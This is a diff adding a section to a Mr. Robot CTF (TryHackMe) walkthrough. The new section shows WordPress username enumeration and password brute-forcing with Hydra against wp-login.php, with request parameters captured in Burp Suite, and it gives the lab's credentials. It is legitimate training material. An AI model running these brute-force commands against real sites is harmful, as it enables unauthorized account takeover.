@@ -83,6 +83,75 @@ This is a walkthrough for the **Mr. Robot CTF** challenge from TryHackMe. In thi
  
  Login and Success! Its an admin user.
 
+---
+
+#### Option 2:
+
+(Using Burp Suite with FoxyProxy plugin to intercept requests)
+
+Check the error message of a failed login attempt. We will need this message for performing a dictionary attack using Hydra.
+
+1. Capture the packet of the failed login attempt with Burp Suite’s Proxy to find its parameters. We will also need these for performing the dictionary attack with Hydra.
+2. Perform a dictionary attack with Hydra to build a wordlist containing valid usernames.
+3. Perform a second dictionary attack using the newly-created username wordlist to find passwords, again, using Hydra.
+
+Let’s try to log in with random credentials:
+
+- When trying to log in using `Admin` as both the username and password, it comes back with `ERROR: Invalid username.` message. Note that down!
+- Next, let’s capture a failed login request using Burp Suite’s Proxy.
+- We notice that on line 15 of this packet capture, there are two parameters: `log` and `pwd`.
+
+We are already halfway through our plan: we have the error message and the POST request parameters. We will use both to build a valid username list.
+
+#### Extracting a refined wordlist:
+
+URL: `http://10.10.134.44/fsocity.dic`
+
+The provided wordlist contains 858,160 words, with many duplicates. We can use the following commands to create a new file called `fs-list`, containing only unique values, reducing the word count to 11,451:
+
+```sh
+wc -w fsocity.dic # check word count
+# 858160
+
+sort fsocity.dic | uniq -d > fs-list # write the repeated words on fs-list
+sort fsocity.dic | uniq -u >> fs-list # append the unique words on fs-list
+
+wc -w fs-list # check word count
+# 11451
+```
+
+Now, we are ready to pass the new wordlist to Hydra and create the list with valid usernames:
+
+```sh
+hydra -L fs-list -p test <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 30
+```
+
+We use the string from the invalid username failure attempt so Hydra knows it's not a valid response.
+
+The expected result should reveal the username `Elliot`. Now, we can use it to get more invalid attempts.
+
+#### Finding the Password:
+
+We are almost done! Now that we have a valid username, we can try to use it, log in, and see what happens.
+
+- The error message has changed, indicating we now have a valid username.
+- We can now reverse the process to find Elliot’s password using Hydra with the valid static username (`elliot`) and pass our refined wordlist (`fs-list`) as the password list:
+
+```sh
+hydra -l elliot -P fs-list <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
+```
+
+The output of the above command should give us the password:
+
+**`ER28-0652`** (From the TV show, it's Elliot's employee number.)
+
+We can now use the obtained credentials to log in.
+
+**And we are in!**
+
+---
+
+
 ### 7. Gain a Reverse Shell
 
 And we are in! So now we can try to set up a reverse shell and get our first foothold on the server:
